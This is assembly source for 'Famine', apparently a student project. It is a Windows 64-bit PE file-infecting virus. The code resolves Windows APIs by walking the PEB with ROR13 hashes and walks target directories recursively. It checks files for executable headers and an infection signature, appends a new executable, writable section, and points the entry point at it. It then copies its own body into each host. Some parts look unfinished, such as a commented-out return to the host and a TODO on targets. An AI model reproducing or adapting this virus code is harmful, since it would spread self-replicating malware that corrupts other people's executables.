%include "src/famine.inc"

bits 64
default rel
global main
global _host
global _get_address_table
global _get_proc_address
global _align_size
global ft_strcmp
global _storeDirectoryData
global _retrieveDirectoryData
global _freeCall
global _check_signature
global _goBackDir
global _inject_file
global _changeDirectory
global _findNextFile
global _prepareChangeDirectory_prepareExit
global _get_address_table
global _alloc_find_data_strust
global _closeHandleFile
global _get_proc_address

section .text

_host:
	xor rcx, rcx
	call 	SGET(s_add_tbl.exit_process) ; call exit

;------------------------------; ***EntryPoint***
main:
    ; * save origin state
	push r9
	push r8
	push rcx
	push rdx

    ; lea rcx, [rel console_name]
    ; mov rdx, 0x40000000 ; GENERIC_WRITE
    ; xor r8, r8          ; No sharing
    ; xor r9, r9
    ; mov QWORD [rsp + 0x20], 0x3   ; OPEN_EXISTING
    ; mov DWORD [rsp + 0x28], 0x0   ; No flags
    ; mov QWORD [rsp + 0x30], 0     ; No template
    ; call SGET(s_add_tbl.create_file_a)

    ; cmp rax, -1
    ; je .skip_print

    ; ; Write "FAMINE\n" to handle
    ; mov rcx, rax        ; hFile
    ; lea rdx, [rel msg_famine]
    ; mov r8, msg_len     ; length
    ; xor r9, r9          ; lpNumberOfBytesWritten = NULL
    ; mov QWORD [rsp + 0x20], 0     ; lpOverlapped = NULL
    ; call SGET(s_add_tbl.write_file)
	; .skip_print:
	
;------------------------------;

_get_address_table:
	push rbp
	mov rbp, rsp
	sub rbp, s_famine_size

	; *** setup of address table
		mov rcx, local_alloc_hash
		call _get_proc_address
		mov SGET(s_add_tbl.local_alloc), rax

		mov rcx, 0x40
		mov rdx, 104
		call SGET(s_add_tbl.local_alloc)

		mov r14, rax ; r14 = address of address table
		push r14
		mov rcx, local_free_hash
		call _get_proc_address ; rax = LocalFree
		mov SGET(s_add_tbl.local_free), rax
		pop r14

		push r14
		mov rcx, exit_process_hash
		call _get_proc_address ; rax = ExitProcess
		mov SGET(s_add_tbl.exit_process), rax
		pop r14

		push r14
		mov rcx, create_file_a_hash
		call _get_proc_address ; rax = CreateFileA
		mov SGET(s_add_tbl.create_file_a), rax
		pop r14

		push r14
		mov rcx, get_file_size_hash
		call _get_proc_address ; rax = GetFileSize
		mov SGET(s_add_tbl.get_file_size), rax
		pop r14

		push r14
		mov rcx, read_file_hash ; rax = ReadFile
		call _get_proc_address
		mov SGET(s_add_tbl.read_file), rax
		pop r14

		push r14
		mov rcx, write_file_hash
		call _get_proc_address ; rax = WriteFile
		mov SGET(s_add_tbl.write_file), rax
		pop r14

		push r14
		mov rcx, close_handle_hash
		call _get_proc_address ; rax = CloseHandle
		mov SGET(s_add_tbl.close_handle), rax
		pop r14

		push r14
		mov rcx, find_first_file_a_hash
		call _get_proc_address ; rax = FindFirstFileA
		mov SGET(s_add_tbl.find_first_file_a), rax
		pop r14

		push r14
		mov rcx, find_next_file_a_hash
		call _get_proc_address ; rax = FindNextFileA
		mov SGET(s_add_tbl.find_next_file_a), rax
		pop r14

		push r14
		mov rcx, set_current_directory_a_hash
		call _get_proc_address ; rax = SetCurrentDirectoryA
		mov SGET(s_add_tbl.set_current_directory_a), rax
		pop r14

		push r14
		mov rcx, get_current_directory_a_hash
		call _get_proc_address ; rax = GetCurrentDirectoryA
		mov SGET(s_add_tbl.get_current_directory_a), rax
		pop r14

		push r14
		mov rcx, get_module_handle_a_hash
		call _get_proc_address ; rax = GetModuleHandleA
		mov SGET(s_add_tbl.get_module_handle_a), rax
		pop r14

	jmp famine

; PARAMETERS
; rcx = function + dll hash
; -----
; return address of the function
_get_proc_address:
		sub rsp, s_proc_size
		mov SGET_PROC(s_proc.target_hash), rcx
		
    ; Access PEB
    	mov rax, QWORD gs:[0x60]              ; RAX = PEB address
    	mov rax, [rax + 0x18]           ; RAX = Address_of_LDR
		mov r10, [rax + 0x10]			; RBX = First entry in InLoadOrderModuleList (PEB_LDR_DATA->InLoadOrderModuleList)

    .find_function_loop:
			mov r11, [r10 + 0x30] ; get pModuleBase

		; typedef struct _IMAGE_NT_HEADERS
			mov eax, [r11 + 0x3c] ; edx = e_lfanew
			lea rax, [r11 + rax + 0x88]
			mov eax, [rax] ; rax = dwExportDirRVA
			test eax, eax
			jz .next_module

		; get pExportDir -> rax
			add rax, r11
			mov SGET_PROC(s_proc.export_table), rax

		; dllBase + 0x58 = LDR_DATA_TABLE_ENTRY->BaseDllName
		; BaseDllName = struct _UNICODE_STRING
			mov rcx, [r10 + DLL_NAME_OFF + 0x8] ; rcx = BaseDllName.Buffer
			movzx rdx, word [r10 + DLL_NAME_OFF + 0x2] ; rdx = BaseDllName.MaxLength
			call .ror13_hash_dll ; return hash of dll
			mov SGET_PROC(s_proc.dll_hash), rax

		; struct IMAGE_EXPORT_DIRECTORY
			mov rax, SGET_PROC(s_proc.export_table)
			mov ecx, [rax + 0x18] ; rcx = pExportTable->NumberOfNames
			mov edx, [rax + 0x20] ; rax = pExportTable->AddressOfNames
			add rdx, r11 ; rdx = pdwFunctionNameBase

		; dwNumFunctions -> rcx 
		; pdwFunctionNameBase -> rdx
		; r10, r11 used
			xor r13, r13
			.loop_function:
				mov r8d, [rdx]
				add r8, r11
				add rdx, 4

				push r8
				push rcx
				mov rcx, r8
				call .ror13_hash_fun
				pop rcx
				pop r8
				
				; dll_hash + function hash == target_hash
				add rax, SGET_PROC(s_proc.dll_hash)
				cmp SGET_PROC(s_proc.target_hash), eax
				je .function_found

				inc r13
				cmp rcx, r13
				jnz .loop_function

			.next_module:
				mov r10, [r10]             ; Get next flink
				test r11, r11                ; If DllBase is NULL, we're done
				jnz .find_function_loop

				; Nothing found
				xor rax, rax
				add rsp,s_proc_size
				ret ; ret NULL

			.function_found:
				; Get ordinal value
					mov rax, SGET_PROC(s_proc.export_table)
					mov edx, [rax + 0x24] ; pExportTable->AddressOfNameOrdinals
					add rdx, r11
					movzx edx, word [rdx + r13*2] ; edx = ordinal value

				; (HMODULE) ((ULONG_PTR) pModuleBase + *(PDWORD)(pModuleBase + pExportDir->AddressOfFunctions + 4 * usOrdinalTableIndex));
					mov ecx, [rax + 0x1C]           ; Load directly into ecx, skip eax
					add rcx, r11
					mov eax, [rcx + rdx*4]          ; More common syntax for scaled index
					lea rax, [r11 + rax]            ; Combine additions using lea

					add rsp, s_proc_size            ; Restore stack frame
					ret

	; PARAMETERS
	; rcx = string
	; rdx = string length
	; -------
	; r8 = counter
	; r9 = dwModuleHash
	; -------
	; return hash of dll
	.ror13_hash_dll:
		xor r9d, r9d          ; Initialize hash (using 32-bit register)
		test rdx, rdx         ; Check if length is zero
		jz .done_hash_dll
		
		.loop_hash_dll:
			movzx eax, byte [rcx] ; Load character directly
			
			; Convert to uppercase (only if lowercase)
			lea r8d, [rax - 'a']  ; Check if lowercase in one operation
			cmp r8b, 'z' - 'a'    ; Check if in range
			ja .skip_upper        ; Skip if not lowercase
			sub al, 0x20         ; Convert to uppercase
		
		.skip_upper:
			ror r9d, 13          ; Rotate hash
			add r9d, eax         ; Add to hash
			
			inc rcx              ; Move to next character
			dec rdx              ; Decrease counter
			jnz .loop_hash_dll   ; Continue if not done
		
		.done_hash_dll:
			mov rax, r9          ; Return hash
			ret
	
	; PARAMETERS
	; rcx = string
	; ------
	; r8 = counter
	; r9 = dwModuleHash
	; ------
	; return hash of dll
	.ror13_hash_fun:
		xor r8, r8
		xor r9, r9
		.loop_hash_fun:
			mov al, byte [rcx + r8]	; al = BaseDllName.Buffer[rcx]


			ror r9d, 13 ; rdx = rdx >> 13
			movzx rax, al ; rax = al
			add r9, rax ; rdx = rdx + rax

			inc r8
			cmp al, 0
			jnz .loop_hash_fun

		.hash_done_fun:
			mov rax, r9
			ret

;-------------------------------------------------------------------------------;
; Here is the real start of famine
;
;  ______   ______     __    __     __     __   __     ______    
; /\  ___\ /\  __ \   /\ "-./  \   /\ \   /\ "-.\ \   /\  ___\   
; \ \  __\ \ \  __ \  \ \ \-./\ \  \ \ \  \ \ \-.  \  \ \  __\   
;  \ \_\    \ \_\ \_\  \ \_\ \ \_\  \ \_\  \ \_\\"\_\  \ \_____\ 
;   \/_/     \/_/\/_/   \/_/  \/_/   \/_/   \/_/ \/_/   \/_____/ 
;                                                  
;-------------------------------------------------------------------------------;
famine:
	; TODO : loop though targets
	lea rcx, [rel targets]
	call SGET(s_add_tbl.set_current_directory_a) ; SetCurrentDirectory("/tmp/test")

    mov rcx, 0x40
    mov rdx, 400 ; 16 * 25 = 400 (go 25 dir deep)
    call SGET(s_add_tbl.local_alloc); Data_storage = LocalAlloc(LPTR, 400)
    mov QWORD [ss:rsp + 104], rax

_alloc_find_data_strust:
    mov rcx, 0x0040
    mov rdx, WIN32_FIND_DATA_size
    call SGET(s_add_tbl.local_alloc) ; FindData = LocalAlloc(LPTR, 328)
    mov r14, rax ; r14 = FindData
	mov SGET(s_famine.s_find_data), r14

    ; Get information about the first file in the directory
    lea rcx, [rel target]
    mov rdx, SGET(s_famine.s_find_data)
    call SGET(s_add_tbl.find_first_file_a) ; FindFirstFileA("*", &FindData)
	mov SGET(s_famine.search_handle), rax
    cmp r12, 1
	jz	_changeDirectory
	jmp	_inject_file ; !!! go to infection

_closeHandleFile:
	mov 	rcx, r12
	call 	SGET(s_add_tbl.close_handle)		; CloseHandle(hFile)

_findNextFile:
	mov 	rcx, SGET(s_famine.search_handle)
	mov 	rdx, r14
	call 	SGET(s_add_tbl.find_next_file_a)		; HANDLE hFile = FindNextFileA(hFile, &win32_find_dataa_struct)
	cmp 	rax, 0 
	jz	_prepareChangeDirectory_prepareExit
	cmp 	r12, 1
	jz	_changeDirectory

; *** Start of the injection ***
_inject_file:
	lea 	rcx, [r14 + 44]
	mov 	rdx, 0x00000000C0000000
	xor 	r8, r8
	mov 	r9, r8 
	mov 	QWORD [ss:rsp + 0x20], 0x4
	mov 	DWORD [ss:rsp + 0x28], 0x80
	mov 	QWORD [ss:rsp + 0x30], r8
	call 	SGET(s_add_tbl.create_file_a); CreateFileA(win32_find_dataa->fileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
	cmp 	rax, 0xFFFFFFFFFFFFFFFF
	jz	_findNextFile

	mov SGET(s_famine.file_handle), rax ; *** s_famine.file_handle: actual HANDLE hFile. We have read/write permissions over the file with this handle ***

;-----------------;
; GET file size   ;
;-----------------;
	mov 	rcx, SGET(s_famine.file_handle)
	xor 	rdx, rdx
	call 	SGET(s_add_tbl.get_file_size)	; GetFileSize(hFile, NULL)
	cmp 	rax, 0xFFFFFFFFFFFFFFFF 	; if the size is invalid (INVALID_FILE_SIZE) ...
	jz	_closeHandleFile		; ... go back and close the handle
	mov 	SGET(s_famine.file_size), rax 			; *** rdi: size of target file ***


;-------------------------------------------------------------------------------;
; Allocate memory in the heap to copy the opened file.. 			
; ... then check if the file meets the following criteria:			
; 										
; 1) The first WORD must be equal to 'MZ'					
; 2) Base of file + 0x3C (SIGNATURE) must be equal to 'PE'			
; 3) WORD SIGNATURE + 4 must be equal to 0x8664 (64bit)				
; 4) IMAGE_FILE_HEADER -> Characteristics must be less than 0x2000 (not a .dll)	
; 5) Signature 'alca' must not present at the beginning of the .text 		
;-------------------------------------------------------------------------------;

	xor 	rcx, rcx
	mov 	rdx, rcx
	add 	rcx, 0x0040
	add 	rdx, SGET(s_famine.file_size)
	call 	SGET(s_add_tbl.local_alloc)		; LocalAlloc(LPTR, sizeof(target))
	mov 	rsi, rax 			; *** rsi: allocation where the file can be read into***
	
	mov 	rcx, SGET(s_famine.file_handle)
	mov 	rdx, rsi
	mov 	r8, SGET(s_famine.file_size)
	xor 	r9, r9 
	mov 	QWORD [ss:rsp + 0x20], r9
	call 	SGET(s_add_tbl.read_file)	; ReadFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToRead, NULL, NULL)

	cmp 	DWORD [rsi], 0x00905A4D		; check if 'MZ'
	jne 	_freeCall

	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi

	cmp 	WORD [ds:rax], 0x4550 		; check if 'PE'
	jne 	_freeCall

	cmp 	WORD [ds:rax + 4], 0x8664	; check if 64bit
	jne 	_freeCall

	add 	rax, 16h
	mov 	rcx, rax 
	xor 	rax, rax 
	mov 	ax, WORD [ds:rcx]
	and 	rax, 0x2000
	cmp 	rax, 0 				; check if .exe
	jne 	_freeCall


	; Find last section
	xor 	rax, rax
	mov		rcx, rax
	mov		rdx, rax

	mov 	eax, [rsi + 3Ch] ;
	add		rax, rsi ;

	mov cx, WORD [ds:rax + 6]
	inc WORD [ds:rax + 6] ; number of section n + 1

	mov dx, WORD [rax + 14h]
	lea r11, [rax + 18h] ; r11 = Optinal Header

	lea rax, [r11 + rdx]

	imul rcx, rcx, 28h ; nSection * sizeof(section)
	add rax, rcx ; rax : end last section


	; ** Check If Signature Exist
	_check_signature:
	    push rax
		push rdi
		push rsi
		push rdx

		; rcx = rsi + s_famine.file_size - (end - signature)
		mov rcx, rsi
		add rcx, SGET(s_famine.file_size)
		sub rcx, (end - signature)

		lea rdi, [rcx]            ; first argument: string in memory
		lea rsi, [rel signature]  ; second argument: expected signature string
		call ft_strcmp            ; ft_strcmp(rdi, rsi)

		test eax, eax             ; check if strcmp returned 0
		jz _freeCall

		pop rdx
		pop rsi
		pop rdi
		pop rax

	mov 	QWORD [ss:rsp + 112], r14	; store WIN32_FIND_DATAA struct onto the stack for later use

	xchg 	r14, rdi 
	xor 	rdi, rdi 			; *** rdi: 0 ***
	
;-------------------------------------------------------;
; The actual infection starts here:			
;							
; 1) 
;-------------------------------------------------------;

; Registers configuration at this moment:
; rax: end last section / rbx: this_code entrypoint / rsi: &target_copy
_setupSectionValue:
	mov DWORD [rax], 0x65746373 	; mov DWORD [rax], 'sect'
	mov DWORD [rax + 24h], 0xE0000000 ; Characteristics

	; ** VirtualAddress **
	mov ecx, DWORD [rax + 8h - 28h] ; rdx: VirtualSize
	add ecx, DWORD [rax + 0Ch - 28h] ; rdx: VirtualSize + VirtualAddress
	mov edx, DWORD [r11 + 20h]
	call _align_size
	mov DWORD [rax + 0Ch], ecx ; VirtualAddress
	mov DWORD [r11 + 10h], ecx ; AddressOfEntryPoint

	; ** VirtualSize **
	mov ecx, FAMINE_SIZE
	mov edx, DWORD [r11 + 20h] ; section Alignment
	call _align_size
	mov DWORD [rax + 8h], ecx ; VirtualSize

	; ** SizeOfImage **
	mov ecx, DWORD [rax + 0Ch]
	add ecx, DWORD [rax + 8h]
	mov edx, DWORD [r11 + 20h]
	call _align_size 
	mov DWORD [r11 + 38h], ecx ; update optinalHeader.SizeOfImage + SizeOfRawData
	
	; ** SizeOfRawData **
	mov ecx, FAMINE_SIZE
	mov edx, DWORD [r11 + 24h] ; file Alignment
	call _align_size
	mov DWORD [rax + 10h], FAMINE_SIZE ; SizeOfRawData

	; ** PointerToRawData **
	mov ecx, SGET(s_famine.file_size)
	mov edx, DWORD [r11 + 24h] ; file Alignment
	call _align_size
	mov DWORD [rax + 14h], ecx ; PointerToRawData
	mov r12, rcx

_copyShellcode:
	mov 	rcx, SGET(s_famine.file_handle)
	call 	SGET(s_add_tbl.close_handle)	; Close old HANDLE used to read the file

	mov 	rcx, QWORD [ss:rsp + 112]
	lea 	rcx, [rcx + 44]			; WIN32_FIND_DATAA->fileName
	mov 	rdx, 0x00000000C0000000
	xor 	r8, r8
	mov 	r9, r8
	mov 	QWORD [ss:rsp + 0x20], 0x2
	mov 	DWORD [ss:rsp + 0x28], 0x80
	mov 	QWORD [ss:rsp + 0x30], r8
	call 	SGET(s_add_tbl.create_file_a); CreateFileA(WIN32_FIND_DATAA->fileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
	
	mov 	r14, rax
	mov 	rcx, r14
	mov 	rdx, rsi
	mov 	r8, SGET(s_famine.file_size)
	xor 	r9, r9
	mov 	QWORD [ss:rsp + 0x20], r9
	call 	SGET(s_add_tbl.write_file)		; WriteFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToWrite, NULL, NULL)
_writePadding:

	; write padding
	mov rcx, 0x40         ; LPTR allocation type (zero-initialized memory)
	mov rdx, 0x200          ; Size of buffer to allocate (number of null bytes)
	call SGET(s_add_tbl.local_alloc) ; LocalAlloc(LPTR, size)

	mov rcx, r14
	mov rdx, rax
	mov r8, r12
	sub r8, SGET(s_famine.file_size)
	xor r9, r9
	mov QWORD [ss:rsp + 0x20], r9
	call SGET(s_add_tbl.write_file); WriteFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToWrite, NULL, NULL)

	mov rcx, r14
	lea rdx, [rel main]
	mov r8, FAMINE_SIZE
	xor r9, r9
	mov QWORD [ss:rsp + 0x20], r9
	call SGET(s_add_tbl.write_file); WriteFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToWrite, NULL, NULL)

	mov 	rcx, r14
	call 	SGET(s_add_tbl.close_handle)	; CloseHandle(hFile)


;------------------------------------------------------------;
; Jump back and find the next file after the infection       ;
;------------------------------------------------------------;

	mov 	rcx, rsi
	call 	SGET(s_add_tbl.local_free)		; LocalFree(target_allocation)
	mov 	r14, QWORD [ss:rsp + 112]	; *** r14: restore WIN32_FIND_DATAA struct ***
	jmp	_findNextFile


;-----------------------------------------------------------------;
; The _freeCall procedure is needed when an invalid file is found ;
;-----------------------------------------------------------------;

_freeCall:
	mov 	rcx, rsi 
	call 	SGET(s_add_tbl.local_free)		; LocalFree(target_allocation)
	jmp	_closeHandleFile


_prepareChangeDirectory_prepareExit:

;---------------------------------------------------;
; Check if we're in 'directory mode' (r12 == 1)     ;
; + If this mode is set, then go back one directory ;
; - If it's not, then turn it on		    ;
;---------------------------------------------------;
	cmp 	r12, 1
	jz	_goBackDir

	xor 	r12, r12
	inc 	r12
	mov 	rcx, r14
	call 	SGET(s_add_tbl.local_free)		; LocalFree(win32_find_dataa)
	jmp	_alloc_find_data_strust


_changeDirectory:
	call 	_verifyDot
	
	cmp	rax, 0
	jz	_findNextFile

	lea 	rcx, [r14 + 44]
	call 	SGET(s_add_tbl.set_current_directory_a)		; SetCurrentDirectoryA(directory)
	cmp	rax, 0
	jz	_findNextFile

	xor 	rax, rax
	mov 	r11, QWORD [ss:rsp + 104]	; *** r11: DirectoryData_storage ***
	call 	_storeDirectoryData

	dec 	r12
	jmp	_alloc_find_data_strust



_verifyDot:
	xor 	rax, rax
	inc 	rax
	cmp 	WORD [ds:r14 + 44], 0x2E2E	; check if file is '..'
	jz	_returnError
	xor 	rcx, rcx
	add 	cl, BYTE [ds:r14 + 44]
	add 	cl, BYTE [ds:r14 + 45]
	cmp 	cl, 0x2E			; check if file is '.'
	jz	_returnError
	ret

_returnError:
	xor 	rax, rax 
	ret

_goBackDir:
	xor 	rcx, rcx
	lea 	rcx, [rel dotdot]		; rcx: '..'
	call 	SGET(s_add_tbl.set_current_directory_a)	; SetCurrentDirectory('..')
	cmp 	rax, 0
	jz	_clearAndTerminate

	xor 	rax, rax
	add 	rax, 384
	mov 	r11, QWORD [ss:rsp + 104]	; *** r11: DirectoryData_storage ***
	call 	_retrieveDirectoryData
	jmp	_findNextFile




;-------------------------------------------------------------------------------;
; The _storeDirectoryData will store the HANDLE hFile (used for reading)	;
; + the WIN32_FIND_DATAA struct for later use					;
; The _retrieveDirectoryData will do the opposite				;
;-------------------------------------------------------------------------------;
; Requirements (_storeDirectoryData)						;
; - rax has to be zero								;
; - r11 has to be a pointer to the DirectoryData_storage allocation		;
; - r13 has to contain the old HANDLE						;
; - r14 has to be a pointer to the old win32_find_dataa struct			;
;										;
; Requirements (_retrieveDirectoryData)						;
; - rax needs to be equal to sizeof(DirectoryData_storage) (320 at the moment)	;
; - r11 needs to be a pointer to DirectoryData_storage				;
;-------------------------------------------------------------------------------;

_storeDirectoryData:
	cmp 	QWORD [ds:r11 + rax], 0
	jne 	_addRax
	xchg 	QWORD [ds:r11 + rax], r13	; store previous HANDLE in DirectoryData_storage
	xchg 	QWORD [ds:r11 + rax + 8], r14	; store previous WIN32_FIND_DATAA struct in DirectoryData_storage
	ret

_addRax:
	add 	rax, 16 
	jmp 	_storeDirectoryData


_retrieveDirectoryData:
	cmp 	QWORD [ds:r11 + rax], 0
	jz 	_subRax
	
	xor 	r13, r13
	mov 	r14, r13
	xchg 	r13, QWORD [ds:r11 + rax]	; restore previous HANDLE in r13 and zero out the previously occupied space in DirectoryData_storage
	xchg 	r14, QWORD [ds:r11 + rax + 8]	; restore previous WIN32_FIND_DATAA struct and zero out the previously occupied space in DirectoryData_storage
	ret

_subRax:
	sub 	rax, 16
	jmp 	_retrieveDirectoryData

; rcx = value
; rdx = alignment
_align_size:
	dec 	edx
	add		ecx, edx
	not 	edx
	and 	ecx, edx
	ret

ft_strcmp:
    xor eax, eax
.loop:
    mov al, [rdi]
    mov dl, [rsi]
    cmp al, dl
    jne .diff
    test al, al
    je .done
    inc rdi
    inc rsi
    jmp .loop
.diff:
    sub eax, edx
.done:
    ret

_clearAndTerminate:
	xor 	rcx, rcx
	add rsp, s_famine_size

	; restore original state
	pop rdx
	pop rcx
	pop r8
	pop r9

    ; Save entry of host
    ; host: rax = 0
    ; infected: rax != 0
	lea rax, [rel main]
	mov rdx, [rel famine_entry]
	sub rax, rdx
	add rax, [rel host_entry]
	; jmp rax

	call 	SGET(s_add_tbl.exit_process)
	
targets db "C:\\tmp\\test\\",0, "C:\\tmp\\test2\\",0
signature db "Famine version 1.0 (c)oded by mbucci-jdecorte",0
famine_entry dq main
host_entry dq end
target db "*", 0;
dotdot db "*", 0;

msg_famine db "FAMINE", 0x0D, 0x0A, 0  ; "FAMINE\n"
msg_len equ $ - msg_famine
console_name db "CONOUT$", 0
end: